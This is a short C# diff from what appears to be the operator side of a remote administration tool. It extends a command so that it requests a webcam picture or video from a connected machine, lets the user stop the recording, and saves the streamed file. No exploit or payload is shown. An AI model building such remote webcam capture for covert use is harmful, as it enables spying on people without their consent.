@@ -18,8 +18,8 @@ namespace Client.Commands
 
         public List<string> validArguments { get; } = new List<string>()
         {
-            "picture ?",
-            "video ?"
+            "picture ?*",
+            "video ?*"
         };
 
 
@@ -38,17 +38,21 @@ namespace Client.Commands
                 return;
             }
 
-            // Get data length
-            var dataLength = int.Parse(ClientCommandsManager.networkManager.ReadLine());
+            if (args[0] == "video")
+            {
+                Console.Write("Press [ENTER] to stop the recording... ");
+                Console.ReadLine();
+                ClientCommandsManager.networkManager.WriteLine("STOP");
+            }
 
             try
             {
                 using (var fs = new FileStream(fileName, FileMode.Create))
                 {
-                    ClientCommandsManager.networkManager.NetworkStreamToStream(fs, dataLength);
+                    ClientCommandsManager.networkManager.NetworkStreamToStream(fs);
                 }
 
-                ColorTools.WriteCommandSuccess($"Screenshot saved : {fileName}");
+                ColorTools.WriteCommandSuccess($"{(args[0] == "video" ? "Video" : "Webcam shot")} saved : {fileName}");
             }
             catch (Exception)
             {
